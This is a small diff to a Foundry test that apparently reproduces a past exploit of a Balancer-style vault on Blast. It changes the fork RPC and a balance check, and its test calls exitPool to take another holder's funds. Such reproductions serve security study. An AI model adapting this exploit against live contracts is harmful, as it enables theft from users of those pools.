@@ -37,13 +37,13 @@ contract Bazaar is BaseTestWithBalanceLog {
     receive() external payable {}
 
     function setUp() public {
-        vm.createSelectFork("blast", BLOCKNUM_TO_FORK_FROM);
+        vm.createSelectFork("https://rpc.blast.io", BLOCKNUM_TO_FORK_FROM);
         fundingToken = address(weth);
     }
 
     function testExploit() public balanceLog {
         vulnVault.exitPool(TARGET_ID, HOLDER_TO_TAKE_FROM, payable(address(this)), buildExitPoolRequest());
-        assertEq(getFundingBal(), EXPECTED_ETH, "Did not get expected ETH");
+        assertEq(weth.balanceOf(address(this)), EXPECTED_ETH, "Did not get expected ETH");
     }
 
     function buildExitPoolRequest() private view returns (IBalancerVault.ExitPoolRequest memory) {
